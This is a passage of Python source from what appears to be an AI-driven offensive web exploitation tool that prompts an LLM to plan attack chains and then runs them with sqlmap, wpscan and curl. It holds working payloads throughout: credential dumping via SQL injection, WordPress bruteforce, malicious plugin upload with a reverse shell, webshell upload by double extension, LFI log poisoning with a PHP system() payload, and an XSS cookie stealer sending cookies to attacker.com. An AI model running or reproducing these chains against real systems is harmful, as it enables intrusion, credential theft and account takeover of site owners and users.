Themes detected: {len(context.get('wordpress', {}).get('themes', []))}
Users detected: {len(context.get('wordpress', {}).get('users', []))}

CVEs:
{json.dumps(context.get('cves', []), indent=2, default=str)}

Vulnerabilities:
{json.dumps(context.get('vulnerabilities', []), indent=2, default=str)}

Return ONLY a JSON list. Each item must contain:
- name
- severity
- steps
- confidence
- reasoning
"""
        try:
            response = self.groq.generate(prompt, max_tokens=2000)

            match = re.search(r"\[[\s\S]*\]", response)
            if not match:
                return []
            json_str = match.group(0)
            try:
                parsed = json.loads(json_str)
            except json.JSONDecodeError:
                # Thử sửa lỗi JSON
                repaired = repair_json(json_str)
                parsed = json.loads(repaired)


            return [item for item in parsed if isinstance(item, dict)]
        except Exception as e:
            logger.error(f"[AI-CHAIN] Failed: {e}")
            return []

    def _merge_and_rank(self, chains: List[Dict]) -> List[Dict]:
        def normalize_step(step: Any) -> Optional[Dict[str, Any]]:
            if isinstance(step, dict):
                action = str(step.get("action") or step.get("name") or "").strip()
                if not action:
                    return None
                normalized = dict(step)
                normalized["action"] = action
                normalized.setdefault("name", action.replace("_", " ").title())
                normalized.setdefault("target", "")
                normalized.setdefault("tool", "")
                normalized.setdefault("payload", "")
                normalized.setdefault("success_indicator", "")
                return normalized
            return None

        def normalize_chain(chain: Dict[str, Any]) -> Optional[Dict[str, Any]]:
            if not isinstance(chain, dict):
                return None
            name = str(chain.get("name") or "").strip()
            if not name:
                return None

            normalized_steps = []
            for step in chain.get("steps", []) or []:
                normalized_step = normalize_step(step)
                if normalized_step:
                    normalized_steps.append(normalized_step)

            if not normalized_steps:
                logger.debug(f"[AI-CHAIN] Dropping malformed chain without executable steps: {name}")
                return None

            normalized = dict(chain)
            normalized["name"] = name
            normalized["steps"] = normalized_steps
            return normalized

        def rank(chain: Dict) -> float:
            severity_score = {"CRITICAL": 100, "HIGH": 70, "MEDIUM": 40, "LOW": 10}.get(
                str(chain.get("severity", "MEDIUM")).upper(),
                0,
            )
            confidence_score = float(chain.get("confidence", 0) or 0) * 50
            return severity_score + confidence_score

        unique: List[Dict] = []
        seen = set()
        for chain in chains:
            chain = normalize_chain(chain)
            if not chain:
                continue
            name = chain.get("name", "")
            if not name or name in seen:
                continue
            seen.add(name)
            unique.append(chain)

        unique.sort(key=rank, reverse=True)
        return unique

    def _generate_chains_with_ai(self, attack_context: Dict) -> List[ExploitChain]:
        """
        Generate exploitation chains using AI/Groq analysis.
        Focuses on realistic multi-step attack paths.
        """
        try:
            # Build prompt with attack context
            context_str = json.dumps({
                'target': attack_context.get('target', ''),
                'endpoints': [(e.get('url', ''), e.get('endpoint_type', '')) for e in attack_context.get('endpoints', [])[:10]],
                'vulnerability_hints': list(attack_context.get('vulnerability_hints', [])[:10]),
                'technologies': attack_context.get('technologies', []),
                'chain_patterns': [p.get('name', '') for p in attack_context.get('chain_patterns', [])],
            }, indent=2)

            prompt = f"""Analyze this target infrastructure and design exploitation chains:

{context_str}

Generate 3-5 realistic attack chains that could lead to:
- RCE (Remote Code Execution)
- Admin access
- Database compromise
- Sensitive data exposure

Format each chain as JSON with:
- entry_point: Starting endpoint
- steps: Array of attack steps (in order)
- technique: Main technique used
- expected_impact: What attacker gains"""

            response = self.groq.generate(
                prompt=prompt,
                system=_CHAIN_PLANNER_SYSTEM,
                temperature=0.3,
                max_tokens=2000,
            )

            # Parse and convert AI response to ExploitChain objects
            chains = self._parse_ai_chains_response(response)
            logger.info(f"[CHAIN] AI generated {len(chains)} chains")
            return chains
        except Exception as e:
            logger.debug(f"[CHAIN] AI chain generation error: {e}")
            return []

    def _parse_ai_chains_response(self, response: str) -> List[ExploitChain]:
            """Parse AI-generated chains from response text with proper JSON cleaning."""
            chains = []
            base_url = self._get_base_url()
            
            if not response or not isinstance(response, str):
                logger.warning("[CHAIN] Empty AI chains response")
                return chains

            try:
                # Sử dụng hàm clean JSON
                parsed_data = self._clean_json_response(response)
                
                if not parsed_data:
                    logger.warning("[CHAIN] Failed to parse AI chains response")
                    return chains

                # Handle both list and single dict
                if isinstance(parsed_data, dict):
                    parsed_data = [parsed_data]
                elif not isinstance(parsed_data, list):
                    return chains

                for chain_data in parsed_data:
                    if not isinstance(chain_data, dict):
                        continue
                    
                    entry_point = chain_data.get('entry_point', '')
                    if entry_point and not entry_point.startswith(('http://', 'https://')):
                        entry_point = self._build_full_url(entry_point)
                    
                    steps = []
                    for step_data in chain_data.get('steps', []):
                        if isinstance(step_data, dict):
                            step_name = step_data.get('name', step_data.get('action', 'Unknown Step'))
                            step_action = step_data.get('action', step_name)
                            step_target = self._resolve_step_target(step_data.get('target', entry_point), step_name, step_action)
                            
                            steps.append(ExploitStep(
                                name=step_name,
                                action=step_action,
                                target=step_target,
                                tool=step_data.get('tool', 'curl'),
                                payload=step_data.get('payload', ''),
                                success_indicator=step_data.get('success_indicator', 'success'),
                                preconditions=step_data.get('preconditions', []),
                                postconditions=step_data.get('postconditions', [])
                            ))
                        elif isinstance(step_data, str):
                            steps.append(ExploitStep(
                                name=step_data,
                                action=step_data,
                                target=entry_point or base_url
                            ))
                    
                    if steps and entry_point:
                        chain = ExploitChain(
                            name=chain_data.get('technique', 'AI Generated Chain'),
                            description=chain_data.get('expected_impact', ''),
                            steps=steps,
                            risk_level="HIGH",
                            prerequisites=[entry_point] if entry_point else [],
                            postconditions=[chain_data.get('expected_impact', '')],
                            preconditions=chain_data.get('preconditions', [])
                        )
                        chains.append(chain)
                        
            except Exception as e:
                logger.error(f"[CHAIN] Failed to parse AI chains response: {e}")
            
            return chains


    def smart_prioritize(self, chains: List[ExploitChain]) -> List[ExploitChain]:
        """
        AI-like prioritization based on impact, feasibility, and state data.
        
        Priority order (as per requirements):
        1. CMS vulnerabilities (WordPress, Drupal, etc.)
        2. Plugin vulnerabilities (WP plugins, themes, extensions)
        3. Authentication weaknesses (login bypass, credential stuffing)
        4. API vulnerabilities (REST, GraphQL, SOAP)
        5. Misconfigurations (exposed admin, debug endpoints)
        6. Advanced exploitation (zero-day, custom attacks)
        
        Chains with stronger evidence run first. Modules without supporting
        evidence are deprioritized or filtered out.
        """
        # Categorization patterns for chain classification
        cms_patterns = ['wordpress', 'wp', 'drupal', 'joomla', 'magento', 'shopify', 
                        'cms', 'content management']
        plugin_patterns = ['plugin', 'theme', 'extension', 'module', 'addon', 
                           'wp-plugin', 'wp-theme', 'woocommerce']
        auth_patterns = ['auth', 'login', 'bypass', 'credential', 'brute', 'password',
                         'session', 'token', 'jwt', 'oauth', 'saml', 'mfa', '2fa']
        api_patterns = ['api', 'rest', 'graphql', 'soap', 'endpoint', 'json', 
                        'graphql', 'rpc', 'webhook']
        misconfig_patterns = ['misconfig', 'exposed', 'unprotected', 'unauthenticated',
                              'debug', 'backup', 'directory listing', 'traversal',
                              'admin panel', 'unprotected']
        advanced_patterns = ['zero-day', '0day', 'custom', 'unknown', 'advanced',
                             'rce', 'code execution', 'deserialization', 'injection']
        
        def get_chain_category(chain: ExploitChain) -> int:
            """
            Get priority category for a chain (1=highest priority).
            Returns category number based on chain name and description.
            """
            chain_text = f"{chain.name} {chain.description}".lower()
            
            # Check categories in priority order
            for pattern in cms_patterns:
                if pattern in chain_text:
                    return 1
            
            for pattern in plugin_patterns:
                if pattern in chain_text:
                    return 2
            
            for pattern in auth_patterns:
                if pattern in chain_text:
                    return 3
            
            for pattern in api_patterns:
                if pattern in chain_text:
                    return 4
            
            for pattern in misconfig_patterns:
                if pattern in chain_text:
                    return 5
            
            for pattern in advanced_patterns:
                if pattern in chain_text:
                    return 6
            
            return 7  # Uncategorized - lowest priority
        
        def calculate_evidence_score(chain: ExploitChain) -> float:
            """
            Calculate evidence strength score for a chain.
            Higher score = stronger evidence supporting the chain.
            """
            score = 0.0
            
            # Check if chain targets are confirmed in state
            targets = {s.target for s in chain.steps if s.target}
            available_targets = set()
            live_hosts = self.state.get("live_hosts", [])
            for host in live_hosts:
                available_targets.add(host.get("url", ""))
            
            # Target availability bonus
            score += len(targets & available_targets) * 10
            
            # Vulnerability confirmation bonus
            vulns = self._get_planning_vulnerabilities(include_detected=True)
            vuln_names = {str(v.get("name") or "").lower() for v in vulns}
            vuln_types = {str(v.get("type") or "").lower() for v in vulns}
            all_vuln_text = ' '.join(vuln_names | vuln_types)
            
            chain_text = f"{chain.name} {chain.description}".lower()
            for vuln_text in all_vuln_text.split():
                if len(vuln_text) > 3 and vuln_text in chain_text:
                    score += 20
            
            # WordPress-specific evidence
            if self.state.get("wordpress_detected"):
                if any(p in chain_text for p in ['wp', 'wordpress', 'plugin', 'theme']):
                    score += 30
            
            # Postconditions indicate impact
            impact_score = self._calculate_impact_score(chain.postconditions)
            score += impact_score * 2
            
            # Risk level bonus
            risk_scores = {"CRITICAL": 50, "HIGH": 30, "MEDIUM": 15, "LOW": 5}
            score += risk_scores.get(chain.risk_level, 0)
            
            return score
        
        def calculate_feasibility_score(chain: ExploitChain) -> float:
            """
            Calculate feasibility score - how likely the chain is to succeed.
            """
            score = 50.0  # Base score
            
            # Check prerequisites against state
            likelihood_score = self._calculate_likelihood_score(chain.prerequisites, chain.preconditions)
            score += likelihood_score
            
            # Complexity penalty: more steps = harder
            complexity_penalty = len(chain.steps) * 5
            score -= complexity_penalty
            
            # Shorter chains are preferred (faster to execute)
            if len(chain.steps) <= 2:
                score += 15
            elif len(chain.steps) <= 4:
                score += 5
            
            return score
        
        # Score and categorize all chains
        for chain in chains:
            category = get_chain_category(chain)
            evidence_score = calculate_evidence_score(chain)
            feasibility_score = calculate_feasibility_score(chain)
            
            # Combined score: category is primary sort (lower = higher priority)
            # Within same category, evidence and feasibility determine order
            # Use negative category so higher priority categories sort first
            chain.priority_score = (
                (10 - category) * 1000 +  # Category priority (1-7 mapped to 9000-3000)
                evidence_score * 10 +      # Evidence strength
                feasibility_score * 5      # Feasibility
            )
            
            # Store category for reference
            chain._category = category
            chain._evidence_score = evidence_score
            chain._feasibility_score = feasibility_score
            
            # === ADAPTIVE LEARNING PATCH ===
            if self.learning_engine:
                learning_data = self.learning_engine.export_learning_data()
                
                failed = learning_data.get("failed_payloads", [])
                success = learning_data.get("successful_payloads", [])
                
                # If chain relates to frequently failed payloads → reduce score
                for f in failed[-50:]:
                    if f.get("vuln_type") and f.get("vuln_type").lower() in chain.name.lower():
                        chain.priority_score -= 50
                
                # If chain has historical success → boost significantly
                for s in success:
                    if s.get("vuln_type") and s.get("vuln_type").lower() in chain.name.lower():
                        chain.priority_score += 100
        
        # Filter out chains with no supporting evidence (score below threshold)
        # Only filter if we have enough chains (> 3) to be selective
        if len(chains) > 3:
            filtered_chains = [c for c in chains if c.priority_score > 0 or c._category <= 3]
            if filtered_chains:
                chains = filtered_chains
        
        # Sort by priority score (descending)
        return sorted(chains, key=lambda c: getattr(c, 'priority_score', 0), reverse=True)

    def _build_conditioned_wp_chains(self) -> List[ExploitChain]:
        """
        Build chains from CVE-conditioned WP findings.
        Only include high-confidence candidates.
        """
        out: List[ExploitChain] = []
        conditioned = self.state.get("wp_conditioned_findings", []) or []
        target = self.state.get("target", "")
        for item in conditioned:
            if not item.get("chain_candidate"):
                continue
            name = item.get("name", "component")
            cves = item.get("cve", []) or []
            cve_txt = ", ".join(cves[:3]) if cves else "known CVE"
            vuln_type = item.get("vuln_type", "unknown")
            auth_req = ((item.get("conditions", {}) or {}).get("auth_requirement", "unknown"))
            endpoint = ((item.get("conditions", {}) or {}).get("candidate_endpoint", target))
            confidence = int(item.get("confidence", 0) or 0)

            chain = ExploitChain(
                name=f"WP Conditioned Chain: {name}",
                description=f"Version-matched {vuln_type} candidate ({cve_txt}) on {name}",
                risk_level=item.get("severity", "HIGH"),
                estimated_time="15-45 min",
                prerequisites=[f"Component present: {name}", f"Auth requirement: {auth_req}"],
                preconditions=["manual authorization confirmed", "proxy logging enabled"],
                postconditions=["manual_verification_decision"],
                steps=[
                    ExploitStep(
                        name="Version Confirmation",
                        action="confirm_component_version",
                        target=endpoint,
                        tool="browser+proxy",
                        success_indicator="version evidence captured",
                        priority=10,
                    ),
                    ExploitStep(
                        name="Condition Check",
                        action="validate_exploit_preconditions",
                        target=endpoint,
                        tool="manual",
                        success_indicator=f"preconditions for {cve_txt} satisfied",
                        priority=9,
                    ),
                    ExploitStep(
                        name="Controlled PoC Replay",
                        action="replay_non_destructive_poc",
                        target=endpoint,
                        tool="repeater",
                        success_indicator="behavioral indicator reproduced safely",
                        priority=8,
                    ),
                    ExploitStep(
                        name="Evidence & Triage",
                        action="document_confirm_or_reject",
                        target=endpoint,
                        tool="reporting",
                        success_indicator="finding marked confirmed/rejected with evidence",
                        priority=7,
                    ),
                ],
            )
            chain.priority_score = max(getattr(chain, "priority_score", 0), confidence + 40)
            out.append(chain)
        return out

    def _calculate_impact_score(self, postconditions: List[str]) -> int:
        """Calculate impact score based on postconditions"""
        impact_map = {
            "code_execution": 100,
            "remote_shell": 100,
            "privilege_escalation": 90,
            "data_exfiltration": 80,
            "file_write": 70,
            "admin_access": 60,
            "user_account_compromise": 50,
            "information_disclosure": 30,
            "denial_of_service": 20
        }
        return max([impact_map.get(pc, 0) for pc in postconditions], default=0)

    def _calculate_likelihood_score(self, prerequisites: List[str], preconditions: List[str]) -> int:
        """Calculate likelihood score based on prerequisites and preconditions"""
        score = 50  # Base score

        # Check prerequisites
        for prereq in prerequisites + preconditions:
            if "WordPress" in prereq and self.state.get("wordpress_detected"):
                score += 20
            elif "SQLi" in prereq:
                vulns = self._get_planning_vulnerabilities(include_detected=True)
                if any("sql" in str(v.get("name") or "").lower() for v in vulns):
                    score += 15
            elif "authenticated" in prereq:
                # Assume if we have session or login vulns, higher likelihood
                vulns = self._get_planning_vulnerabilities(include_detected=True)
                if any(
                    "auth" in str(v.get("name") or "").lower() or "login" in str(v.get("name") or "").lower()
                    for v in vulns
                ):
                    score += 10
            elif "file_upload" in prereq:
                endpoints = self.state.get("prioritized_endpoints", [])
                if any("upload" in ep.get("categories", []) for ep in endpoints):
                    score += 15

        return score

    def execute_chain(self, chain: ExploitChain) -> Dict[str, any]:
        """Execute an exploit chain step by step, respecting dependencies"""
        logger.info(f"[EXEC] Starting chain: {chain.name}")
        results = {"chain": chain.name, "steps_executed": [], "success": False, "final_payload": None}

        # Check prerequisites
        if not self._check_prerequisites(chain.prerequisites):
            logger.warning(f"[EXEC] Prerequisites not met for {chain.name}")
            return results

        executed_steps = set()
        for step in sorted(chain.steps, key=lambda s: s.priority, reverse=True):
            # Check dependencies
            if step.depends_on and not all(dep in executed_steps for dep in step.depends_on):
                logger.info(f"[EXEC] Skipping {step.name} - dependencies not met")
                continue

            logger.info(f"[EXEC] Executing step: {step.name}")
            step_result = self._execute_step(step)
            results["steps_executed"].append({"step": step.name, "result": step_result})

            if step_result.get("success"):
                executed_steps.add(step.name)
                if step.name == chain.steps[-1].name:  # Last step
                    results["success"] = True
                    results["final_payload"] = step_result.get("output")
            else:
                logger.warning(f"[EXEC] Step {step.name} failed, aborting chain")
                break

        return results

    def _check_prerequisites(self, prereqs: List[str]) -> bool:
        """Check if prerequisites are met based on state"""
        for prereq in prereqs:
            if "WordPress" in prereq:
                if not self.state.get("wordpress_detected"):
                    return False
            elif "SQLi" in prereq:
                vulns = self._get_planning_vulnerabilities(include_detected=True)
                if not any("sql" in str(v.get("name") or "").lower() for v in vulns):
                    return False
            # Add more checks as needed
        return True

    def _execute_step(self, step: ExploitStep) -> Dict[str, any]:
        """Execute a single step using appropriate tool"""
        result = {"success": False, "output": "", "error": ""}
        raw_tool = (step.tool or "").strip().lower()
        tool_alias = {
            "wpscan/hydra": "wpscan",
            "curl/browser": "curl",
            "browser/curl": "curl",
            "nc/python": "curl",
            "custom_script": "curl",
        }
        tool = tool_alias.get(raw_tool, raw_tool.split("/", 1)[0] if "/" in raw_tool else raw_tool)

        try:
            if tool == "sqlmap":
                cmd = ["sqlmap", "-u", step.target, "--batch", "--level=5", "--risk=3"]
                if step.payload:
                    cmd.extend(step.payload.split())
                ret, out, err = run_command(cmd, timeout=600)
                result["success"] = ret == 0 and step.success_indicator in out
                result["output"] = out
                result["error"] = err

            elif tool == "curl":
                cmd = ["curl", "-s", step.target]
                if step.payload:
                    cmd.extend(["-d", step.payload])
                ret, out, err = run_command(cmd, timeout=60)
                result["success"] = step.success_indicator in out if step.success_indicator else ret == 0
                result["output"] = out
                result["error"] = err

            elif tool == "wpscan":
                cmd = ["wpscan", "--url", step.target, "--enumerate", "u"]
                if step.payload:
                    cmd.extend(step.payload.split())
                ret, out, err = run_command(cmd, timeout=300)
                result["success"] = step.success_indicator in out if step.success_indicator else ret == 0
                result["output"] = out
                result["error"] = err

            # Add more tool executions as needed
            else:
                logger.warning(f"[EXEC] Tool {step.tool} not implemented yet")
                result["error"] = f"Tool {step.tool} not supported"

        except Exception as e:
            result["error"] = str(e)

        return result

    def _build_wp_admin_chain(self, users: List[str]) -> ExploitChain:
        """WordPress: enumerate → brute → wp-admin → plugin upload → RCE"""
        primary_user = users[0] if users else "admin"
        has_plugins = bool(self.state.get("wp_plugins", []))
        description = "Bruteforce WP credentials, log in as admin, upload malicious plugin for RCE"
        if not has_plugins:
            description += " (requires manual credential recovery or a confirmed plugin-management foothold)"

        return ExploitChain(
            name="WordPress Admin Takeover → RCE",
            description=description,
            risk_level="CRITICAL",
            estimated_time="15-60 min",
            prerequisites=["WordPress detected", "Login page accessible"],
            preconditions=["wp_users_enumerated"],
            postconditions=["code_execution", "remote_shell", "admin_access"],
            steps=[
                ExploitStep(
                    name="User Enumeration",
                    action="enumerate_wp_users",
                    # Dùng ?author=1 thay vì REST API vì /wp-json/wp/v2/users hay bị 404
                    target=self._build_full_url("?author=1"),
                    tool="curl",
                    success_indicator="author",
                    priority=10,
                ),
                ExploitStep(
                    name="Password Bruteforce",
                    action="bruteforce_wp_login",
                    target=self._build_full_url("wp-login.php"),
                    tool="wpscan/hydra",
                    payload=f"username={primary_user}",
                    depends_on=["User Enumeration"],
                    success_indicator="valid credentials found",
                    priority=9,
                ),
                ExploitStep(
                    name="Admin Login",
                    action="login_wp_admin",
                    target=self._build_full_url("wp-admin/"),
                    tool="curl/browser",
                    depends_on=["Password Bruteforce"],
                    success_indicator="admin dashboard accessible",
                    priority=8,
                ),
                ExploitStep(
                    name="Plugin Upload",
                    action="upload_malicious_plugin",
                    target=self._build_full_url("wp-admin/plugin-install.php"),
                    tool="curl",
                    payload="malicious_plugin.zip",
                    depends_on=["Admin Login"],
                    success_indicator="plugin activated",
                    priority=7,
                ),
                ExploitStep(
                    name="Reverse Shell",
                    action="trigger_reverse_shell",
                    target=self._build_full_url("wp-content/plugins/malicious/shell.php"),
                    tool="nc",
                    payload="cmd=id",
                    depends_on=["Plugin Upload"],
                    success_indicator="shell connection established",
                    priority=6,
                    postconditions=["remote_shell"]
                ),
            ]
        )

    def _build_xmlrpc_chain(self, users: List[str]) -> ExploitChain:
        """XML-RPC multicall bruteforce"""
        return ExploitChain(
            name="XML-RPC Multicall Bruteforce",
            description="Abuse XML-RPC system.multicall to test many passwords at once",
            risk_level="HIGH",
            estimated_time="5-20 min",
            prerequisites=["xmlrpc.php accessible"],
            steps=[
                ExploitStep(
                    name="Verify XML-RPC",
                    action="check_xmlrpc",
                    target=self._build_full_url("xmlrpc.php"),
                    tool="curl",
                    payload="system.listMethods",
                    success_indicator="methodResponse received",
                    priority=10,
                ),
                ExploitStep(
                    name="Multicall Bruteforce",
                    action="xmlrpc_multicall",
                    target=self._build_full_url("xmlrpc.php"),
                    tool="custom_script",
                    payload="wp.getUsersBlogs multicall",
                    depends_on=["Verify XML-RPC"],
                    success_indicator="valid credentials in response",
                    priority=9,
                ),
            ]
        )

    def _build_sqli_chain(self, vuln: Dict) -> ExploitChain:
        """SQL injection → data exfil → possible auth bypass"""
        vuln_url = vuln.get("url", "")
        if not vuln_url.startswith(('http://', 'https://')):
            vuln_url = self._build_full_url(vuln_url)
        
        return ExploitChain(
            name="SQL Injection → Data Exfiltration",
            description="Exploit SQLi to dump credentials and sensitive data",
            risk_level="CRITICAL",
            estimated_time="10-30 min",
            prerequisites=["SQLi vulnerability found"],
            preconditions=[],
            postconditions=["data_exfiltration", "information_disclosure"],
            steps=[
                ExploitStep(
                    name="Confirm SQLi",
                    action="test_sqli",
                    target=vuln_url,
                    tool="sqlmap",
                    payload="' OR '1'='1",
                    success_indicator="SQL error or boolean difference detected",
                    priority=10,
                ),
                ExploitStep(
                    name="Database Enumeration",
                    action="enumerate_databases",
                    target=vuln_url,
                    tool="sqlmap",
                    payload="--dbs",
                    depends_on=["Confirm SQLi"],
                    success_indicator="database list extracted",
                    priority=9,
                ),
                ExploitStep(
                    name="Dump Credentials",
                    action="dump_users_table",
                    target=vuln_url,
                    tool="sqlmap",
                    payload="--dump -T users",
                    depends_on=["Database Enumeration"],
                    success_indicator="credentials dumped",
                    priority=8,
                ),
                ExploitStep(
                    name="Auth Bypass",
                    action="try_extracted_credentials",
                    target=self._build_full_url("login"),
                    tool="curl",
                    depends_on=["Dump Credentials"],
                    success_indicator="authenticated successfully",
                    priority=7,
                    postconditions=["admin_access"]
                ),
            ]
        )

    def _build_upload_chain(self, endpoint: Dict) -> ExploitChain:
        """File upload → webshell → RCE"""
        upload_url = endpoint.get("url", "")
        if not upload_url.startswith(('http://', 'https://')):
            upload_url = self._build_full_url(upload_url)
        
        return ExploitChain(
            name="File Upload → Webshell → RCE",
            description="Bypass file upload restrictions to deploy a webshell",
            risk_level="CRITICAL",
            estimated_time="5-20 min",
            prerequisites=["File upload endpoint found"],
            steps=[
                ExploitStep(
                    name="Test Upload",
                    action="upload_benign_file",
                    target=upload_url,
                    tool="curl",
                    payload="test.txt",
                    success_indicator="upload successful",
                    priority=10,
                ),
                ExploitStep(
                    name="Bypass Extension Filter",
                    action="upload_php_double_ext",
                    target=upload_url,
                    tool="curl",
                    payload="shell.php.jpg",
                    depends_on=["Test Upload"],
                    success_indicator="file accepted",
                    priority=9,
                ),
                ExploitStep(
                    name="Execute Webshell",
                    action="trigger_webshell",
                    target=self._build_full_url("uploads/shell.php"),
                    tool="curl",
                    payload="?cmd=id",
                    depends_on=["Bypass Extension Filter"],
                    success_indicator="command output received",
                    priority=8,
                ),
            ]
        )

    def _build_lfi_chain(self, endpoint: Dict) -> ExploitChain:
        """LFI → log poisoning → RCE"""
        endpoint_url = endpoint.get("url", "")
        if not endpoint_url.startswith(('http://', 'https://')):
            endpoint_url = self._build_full_url(endpoint_url)
        
        return ExploitChain(
            name="LFI → Log Poisoning → RCE",
            description="Exploit LFI to read sensitive files, then poison logs for RCE",
            risk_level="HIGH",
            estimated_time="15-45 min",
            prerequisites=["LFI parameter found"],
            steps=[
                ExploitStep(
                    name="Confirm LFI",
                    action="test_lfi",
                    target=endpoint_url,
                    payload="../../../../etc/passwd",
                    success_indicator="passwd file content in response",
                    priority=10,
                ),
                ExploitStep(
                    name="Read Config Files",
                    action="read_config",
                    target=endpoint_url,
                    payload="../../../../var/www/html/config.php",
                    depends_on=["Confirm LFI"],
                    success_indicator="database credentials found",
                    priority=9,
                ),
                ExploitStep(
                    name="Log Poisoning",
                    action="inject_php_in_logs",
                    target=self._get_base_url(),
                    payload="<?php system($_GET['cmd']); ?>",
                    depends_on=["Confirm LFI"],
                    success_indicator="PHP code in logs",
                    priority=8,
                ),
                ExploitStep(
                    name="Execute via LFI",
                    action="include_poisoned_log",
                    target=endpoint_url,
                    payload="../../../../var/log/apache2/access.log&cmd=id",
                    depends_on=["Log Poisoning"],
                    success_indicator="RCE achieved",
                    priority=7,
                ),
            ]
        )

    def _build_xss_chain(self, vuln: Dict) -> ExploitChain:
        """XSS → session hijack → account takeover"""
        vuln_url = vuln.get("url", "")
        if not vuln_url.startswith(('http://', 'https://')):
            vuln_url = self._build_full_url(vuln_url)
        
        admin_url = self._build_full_url("admin")
        
        return ExploitChain(
            name="XSS → Session Hijack → Account Takeover",
            description="Use stored/reflected XSS to steal admin session cookies",
            risk_level="HIGH",
            estimated_time="30-120 min",
            prerequisites=["XSS vulnerability found"],
            steps=[
                ExploitStep(
                    name="Confirm XSS",
                    action="test_xss",
                    target=vuln_url,
                    payload="<script>alert(1)</script>",
                    success_indicator="alert triggered",
                    priority=10,
                ),
                ExploitStep(
                    name="Setup Cookie Collector",
                    action="start_listener",
                    target="http://127.0.0.1:8000",
                    tool="nc/python",
                    success_indicator="server listening",
                    priority=9,
                ),
                ExploitStep(
                    name="Inject Cookie Stealer",
                    action="inject_cookie_stealer",
                    target=vuln_url,
                    payload="<script>document.location='http://attacker.com/?c='+document.cookie</script>",
                    depends_on=["Setup Cookie Collector"],
                    success_indicator="admin visits page",
                    priority=8,
                ),
                ExploitStep(
                    name="Session Replay",
                    action="use_stolen_session",
                    target=admin_url,
                    tool="browser/curl",
                    depends_on=["Inject Cookie Stealer"],
                    success_indicator="admin access achieved",
                    priority=7,
                ),
            ]
        )

    def _build_wp_plugin_chain(self, plugin: Dict) -> ExploitChain:
        """Exploit vulnerable WordPress plugin"""
        plugin_name = plugin.get("name", "unknown")
        vulns = plugin.get("vulnerabilities", [])
        vuln_type = vulns[0].get("type", "unknown") if vulns else "unknown"

        return ExploitChain(
            name=f"WordPress Plugin Exploit: {plugin_name}",
            description=f"Exploit {vuln_type} vulnerability in plugin {plugin_name}",
            risk_level="CRITICAL" if "RCE" in vuln_type else "HIGH",
            estimated_time="5-15 min",
            prerequisites=[f"Plugin {plugin_name} installed and active"],
            steps=[
                ExploitStep(
                    name="Confirm Plugin Version",
                    action="check_plugin_version",
                    target=self._build_full_url(f"wp-content/plugins/{plugin_name}/readme.txt"),
                    success_indicator="vulnerable version confirmed",
                    priority=10,
                ),
                ExploitStep(
                    name="Send Exploit Payload",
                    action="exploit_plugin_vuln",
                    target=self._build_full_url(f"wp-content/plugins/{plugin_name}/"),
                    tool="curl/metasploit",
                    payload=f"{vuln_type} payload",
                    depends_on=["Confirm Plugin Version"],
                    success_indicator="exploit successful",
                    priority=9,
                ),
            ]
        )

    def combine_chains(self, chains: List[ExploitChain]) -> List[ExploitChain]:
        """Intelligently combine overlapping chains for higher impact"""
        combined = []
        used = set()

        for i, chain1 in enumerate(chains):
            if i in used:
                continue
            combined_chain = chain1
            for j, chain2 in enumerate(chains):
                if j <= i or j in used:
                    continue
                if self._chains_overlap(chain1, chain2):
                    combined_chain = self._merge_chains(chain1, chain2)
                    used.add(j)
            combined.append(combined_chain)
            used.add(i)

        logger.info(f"[CHAIN] Combined into {len(combined)} chains")
        return combined

    def _chains_overlap(self, c1: ExploitChain, c2: ExploitChain) -> bool:
        """Check if two chains share common targets or vulns"""
        c1_targets = {s.target for s in c1.steps}
        c2_targets = {s.target for s in c2.steps}
        return bool(c1_targets & c2_targets) or c1.name.split("→")[0] == c2.name.split("→")[0]

    def _merge_chains(self, c1: ExploitChain, c2: ExploitChain) -> ExploitChain:
        """Merge two chains into one with combined steps"""
        merged_steps = c1.steps + [s for s in c2.steps if s not in c1.steps]
        return ExploitChain(
            name=f"{c1.name} + {c2.name}",
            description=f"Combined: {c1.description} + {c2.description}",
            risk_level="CRITICAL" if "CRITICAL" in [c1.risk_level, c2.risk_level] else "HIGH",
            estimated_time=f"{c1.estimated_time} + {c2.estimated_time}",
            prerequisites=list(set(c1.prerequisites + c2.prerequisites)),
            steps=merged_steps
        )

    def _detect_chain_patterns(self) -> List[ExploitChain]:
        """Detect exploit chain patterns from endpoints and vulns"""
        chains = []
        endpoints = self.state.get("prioritized_endpoints", [])
        vulns = self._get_planning_vulnerabilities(include_detected=True)

        # Pattern: Upload + Admin = RCE
        upload_eps = [e for e in endpoints if "upload" in e.get("categories", [])]
        admin_eps = [e for e in endpoints if "admin" in e.get("categories", [])]
        if upload_eps and admin_eps:
            chains.append(self._build_upload_admin_chain(upload_eps[0], admin_eps[0]))

        # Pattern: Auth bypass + Admin access
        auth_vulns = [
            v for v in vulns
            if "auth" in str(v.get("name") or "").lower() or "bypass" in str(v.get("name") or "").lower()
        ]
        if auth_vulns and admin_eps:
            chains.append(self._build_auth_bypass_chain(auth_vulns[0], admin_eps[0]))

        # Pattern: LFI + Log poisoning
        lfi_vulns = [v for v in vulns if "lfi" in str(v.get("name") or "").lower()]
        if lfi_vulns:
            chains.append(self._build_lfi_log_poison_chain(lfi_vulns[0]))

        return chains

    def _build_upload_admin_chain(self, upload_ep: Dict, admin_ep: Dict) -> ExploitChain:
        upload_url = upload_ep.get("url", "")
        if not upload_url.startswith(('http://', 'https://')):
            upload_url = self._build_full_url(upload_url)
        
        admin_url = admin_ep.get("url", "")
        if not admin_url.startswith(('http://', 'https://')):
            admin_url = self._build_full_url(admin_url)
        
        return ExploitChain(
            name="Upload → Admin Access → RCE",
            description="Upload malicious file, gain admin access, execute RCE",
            risk_level="CRITICAL",
            estimated_time="10-30 min",
            prerequisites=["Upload endpoint", "Admin panel"],
            steps=[
                ExploitStep(name="Upload Shell", action="upload_webshell", target=upload_url, tool="curl", payload="shell.php"),
                ExploitStep(name="Access Admin", action="login_admin", target=admin_url, tool="curl", depends_on=["Upload Shell"]),
                ExploitStep(name="Execute RCE", action="trigger_shell", target=self._build_full_url("uploaded_shell.php"), tool="curl", depends_on=["Access Admin"], payload="?cmd=id"),
            ]
        )

    def _build_auth_bypass_chain(self, vuln: Dict, admin_ep: Dict) -> ExploitChain:
        vuln_url = vuln.get("url", "")
        if not vuln_url.startswith(('http://', 'https://')):
            vuln_url = self._build_full_url(vuln_url)
        
        admin_url = admin_ep.get("url", "")
        if not admin_url.startswith(('http://', 'https://')):
            admin_url = self._build_full_url(admin_url)
        
        return ExploitChain(
            name="Auth Bypass → Admin Takeover",
            description="Bypass authentication to access admin panel",
            risk_level="HIGH",
            estimated_time="5-15 min",
